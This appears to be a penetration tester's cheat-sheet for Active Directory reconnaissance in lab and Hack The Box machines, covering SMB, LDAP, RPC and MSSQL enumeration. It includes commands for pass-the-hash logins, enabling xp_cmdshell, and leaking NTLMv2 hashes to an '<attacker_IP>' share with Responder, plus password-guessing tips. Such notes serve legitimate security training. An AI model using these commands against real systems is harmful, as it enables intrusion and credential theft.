---
layout: default
---


# Initial Recon

### CRACKMAPEXEC

We perform a full network analysis

```bash
crackmapexec smb 10.0.2.0/24                                      
SMB         10.0.2.11       445    BAYEK-PC         [*] Windows 10.0 Build 19041 x64 (name:BAYEK-PC) (domain:ASSASSINS.local) (signing:False) (SMBv1:False)
SMB         10.0.2.2        445    DESKTOP-2661V8G  [*] Windows 10.0 Build 19041 x64 (name:DESKTOP-2661V8G) (domain:DESKTOP-2661V8G) (signing:False) (SMBv1:False)
SMB         10.0.2.10       445    MASYAF-DC        [*] Windows 10.0 Build 20348 x64 (name:MASYAF-DC) (domain:ASSASSINS.local) (signing:True) (SMBv1:False)

```

If we have credentials we can try to login using a variety of services:

- ssh
- mssql
- smb
- winrm
- ftp
- rdp
- ldap

```bash
crackmapexec smb 10.0.2.10 -u "administrator" -p 'P$$$ssl345'
SMB         10.0.2.10       445    MASYAF-DC        [*] Windows 10.0 Build 20348 x64 (name:MASYAF-DC) (domain:ASSASSINS.local) (signing:True) (SMBv1:False)
SMB         10.0.2.10       445    MASYAF-DC        [+] ASSASSINS.local\administrator:P$$$ssl345 (Pwn3d!)
```

When we try to login using crackmapexec and we see (Pwn3d!) in any machines means that can execute commands. If we are using SMB then it also means that we have local administrative privileges on that machine.

### SMB

### Null session

First of all we would try to connect with a guest session

```bash
smbclient -L  \\\\10.10.11.222\\              
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Department Shares Disk      
        Development     Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share
```

```bash
smbmap -H 10.10.11.222 -u "%"
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.11.222:445        Name: authority.htb             Status: Guest session   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Department Shares                                       NO ACCESS
        Development                                             READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share
```

### Connect to a share

If we want to connect to any share we can use smbclient

```bash
smbclient  \\\\10.10.11.222\\Development
```

With credentials would be as follows

```bash
smbclient \\\\10.0.2.10\\ -U ASSASSINS/administrator%'P$$$ssl345'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        assassinsfiles  Disk      The assassins storage
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.0.2.10 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

If we don’t know the domain we can try to login without it. If we use WORKGROUP as the domain then we will perform a local login in that machine, with no domains involved.

### Mount a share in Linux

This is useful if we don’t want to be using smbclient CLI. In order to mount a SMB share in a linux directory we have to install cifs tools.

```bash
sudo apt-get install cifs-utils
```

Now we simply create a folder where the share will be mounted and we mount the share there.

```bash
sudo mkdir /mnt/development
sudo mount -t cifs //10.10.11.222/Development /mnt/development -o username=shareuser,password=sharepassword,domain=nixcraft
```

- Maybe a share is the wwwroot for a server

### LDAP

Extract everything from domain

```bash
ldapsearch -x -H ldap://<IP> -b "DC=htb,DC=local"
ldapsearch -H ldap://<IP> -x -s base namingcontexts
ldapsearch -H ldap://<IP> -b "DC=support,DC=htb" -U <user> -w <pass>
ldapsearch [-x] -H ldap://<IP address> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch [-x] -H ldap://172.16.224.10  -D '<USERNAME>@<DOMAIN>' -w '<PASSWORD>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

Another tool we can use is [**windapsearch.py**](http://windapsearch.py)

```bash
./windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.161
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=htb,DC=local
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[+] Enumerating all AD users
[+]     Found 30 users:

cn: Sebastien Caron
userPrincipalName: sebastien@htb.local

cn: Lucinda Berger
userPrincipalName: lucinda@htb.local

cn: Andy Hislip
userPrincipalName: andy@htb.local

cn: Mark Brandt
userPrincipalName: mark@htb.local

cn: Santi Rodriguez
userPrincipalName: santi@htb.local
```

```bash
┌──(kali㉿kali)-[~/machines/windows/intelligence]
└─$ windapsearch.py --dc-ip 10.10.10.248 -u 'Tiffany.Molina@intelligence.htb' -p 'NewIntelligenceCorpUser9876' --users                     
[+] Using Domain Controller at: 10.10.10.248
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=intelligence,DC=htb
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      u:intelligence\Tiffany.Molina

[+] Enumerating all AD users
[+]     Found 41 users:
```

When enumerating the full tree there are various ways we can take to find strange fields in the tree. In order to do this we will export the full LDAP tree to a file and use regex to find interesting information.

### Searching for common strings

```bash
cat full_tree.txt | grep -iE "password|pass|passwd|pwd|pw"
```

### Searching users

```bash
cat full_tree.txt | grep sAMAccountName
```

Also we can target an specific user.

```bash
cat full_tree.txt| grep r.thompson -A 10 -B 31
```

### Searching by descriptions

```bash
cat full_tree.txt | grep description
```

### Filtering by non-common fields

The typical fields in LDAP can be the following:

```bash
^dn|^dc|^objectClass|^objectClass|^objectClass|^objectClass|^cn|^sn|^ou|^givenName|^distinguishedName|^instanceType|^whenCreated|^whenChanged|^displayName|^uSNCreated|^memberOf|^uSNChanged|^name|^objectGUID|^userAccountControl|^badPwdCount|^codePage|^countryCode|^badPasswordTime|^lastLogoff|^lastLogon|^pwdLastSet|^primaryGroupID|^objectSid|^accountExpires|^logonCount|^sAMAccountName|^sAMAccountType|^userPrincipalName|^objectCategory|^dSCorePropagationData|^dSCorePropagationData|^dSCorePropagationData|^dSCorePropagationData|^dSCorePropagationData|^lastLogonTimestamp|^msDS-SupportedEncryptionTypes|^serverReference|^showInAdvancedViewOnly|^msDFSR-DirectoryFilter|^systemFlags|^#|^msDFSR-RootPath|^msDFSR-StagingPath|^msDFSR-Enabled|^msDFSR-Options|^msDFSR-ContentSetGuid|^msDFSR-ReplicationGroupGuid|^msDFSR-ReadOnly|^lastSetTime|^priorSetTime|^isCriticalSystemObject|^fSMORoleOwner|^rIDAvailablePool|^isCriticalSystemObject|^rIDAllocationPool|^rIDPreviousAllocationPool|^rIDUsedPool|^rIDNextRID|^member|^groupType|^scriptPath|^MemberReferenceBL|^ComputerReference|^FileFilter|^ReplicationGroupType|^ref|^msDFSR-MemberReference|^msDFSR-FileFilter|^servicePrincipalName|^dNSHostName:|^rIDSetReferences|^revision|^samDomainUpdates|^localPolicyFlags|^operatingSystem|^operatingSystemVersion|^operatingSystemServicePack|^creationTime|^forceLogoff|^lockoutDuration|^lockOutObservationWindow|^lockoutThreshold|^maxPwdAge|^minPwdAge|^minPwdLength|^modifiedCountAtLastProm|^nextRid|^pwdProperties|^pwdHistoryLength|^serverState|^uASCompat|^modifiedCount|^ipsecName|^ipsecID|^ipsecDataType|^ipsecData|^iPSECNegotiationPolicyType|^iPSECNegotiationPolicyAction|^ipsecID|^ipsecDataType|^ipsecData|^ipsecOwnersReference|^auditingPolicy|^description|^gPLink|^ipsecFilterReference|^ipsecISAKMPReference|^ipsecNFAReference|^ipsecNegotiationPolicyReference|^masteredBy|^ms-DS-MachineAccountQuota|^msDFSR-ComputerReference|^msDFSR-ComputerReferenceBL|^msDFSR-Flags|^msDFSR-ReplicationGroupType|^msDFSR-Version|^msDS-AllUsersTrustQuota|^msDS-Behavior-Version|^msDS-IsDomainFor|^msDS-NcType|^msDS-PerUserTrustQuota|^msDS-PerUserTrustTombstonesQuota|^msDS-TombstoneQuotaFactor|^msDs-masteredBy|^nTMixedDomain|^otherWellKnownObjects|^rIDManagerReference|^result|^search|^subRefs|^wellKnownObjects
```

We can use them with grep and the full tree to filter and see uncommon fields.

```bash
cat full_tree.txt| grep -vE "<FIELD_1> | <FIELD_2 | ..." | sed '/^$/d' | grep -E "^.*?:"
```

[https://troopers.de/downloads/troopers19/TROOPERS19_AD_Fun_With_LDAP.pdf](https://troopers.de/downloads/troopers19/TROOPERS19_AD_Fun_With_LDAP.pdf)

### RPC

### Login

```bash
rpcclient -U "" -N <TARGET_IP>
rpcclient -U "<USERNAME>[%<PASSWORD>]" <TARGET_IP>
rpcclient -U "<USERNAME>%HASH" --pw-nt-hash <TARGET_IP>
```

We could also enumerate endpoints with **rpcmap.py** from impacket or nay other tool from impacket that interacts with RPC.

### IPv6

If we don’t find nothing using IPv4 we can use IPv6. To obtain the IPv6 of the machine we can use https://github.com/mubix/IOXIDResolver

### MSSQL

Default databases:

```bash
master       

tempdb       

model        

msdb

Resource
```

### Obtain all users in the database

- `select * from sys.database_principals;`

### Obtain all databases

- `SELECT name FROM master.dbo.sysdatabases;`

### Get tables

- `select * FROM <DATABASE_NAME>.INFORMATION_SCHEMA.TABLES;`

### Execute commands

Execute commands:

```bash
EXECUTE sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;

EXEC master..xp_cmdshell 'whoami'
```

### Steal NTLMv2 Hash

Steal NTLMv2 Hash

```bash
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'
```

We must have enable a listener with responder or and SMB server.

```bash
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support
```

### Common ports

- Port 53 is open and is hosting a DNS service over TCP
- Port 80 is open and is hosting an HTTP server
- Port 88 is open and is hosting the kerberos service.
- Ports 135 / 139 / 445 are open and are hosting the RPC / NetBIOS / SMB share services respectively.
- Ports 389 / 3268 and 636 / 3269 are open and hosting the LDAP/S services respectively
- Port 464 is open are hosting a Kerberos password change service, typically seen on DCs and generally not of much interest.
- Ports 593 and 5722 are hosting RPC services.
- Port 5985 is hosting the WinRM service, which will be good if credentials are found. 5986 is WinRM but SSL.
- Port 9389 is hosting the .NET Message Framing service.
- Ports 49xxx are hosting the high port RPC services.

### Bruteforce

If we have perform a full recon over the domain a none of this services are accessible we want to try other simpler ways to have a foothold:

- try username as password
- username and append some payloads
- try common passwords
- try first letter username - full last name- a year
- try username and the lastname